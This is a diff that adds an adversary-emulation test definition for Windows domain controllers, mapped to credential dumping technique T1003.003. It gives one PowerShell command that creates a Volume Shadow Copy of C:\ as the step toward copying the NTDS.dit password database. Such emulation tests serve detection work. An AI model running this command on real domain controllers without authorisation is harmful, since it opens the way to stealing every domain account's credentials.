@@ -1,0 +1,15 @@
+- id: 81c93e09-4131-5416-addb-e439c715f8d6
+  name: Soumaia ART Tests - Create Volume Shadow Copy with Powershell
+  description: 'This test is intended to be run on a domain Controller.
+
+
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy. (requires elevation)'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          (gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')
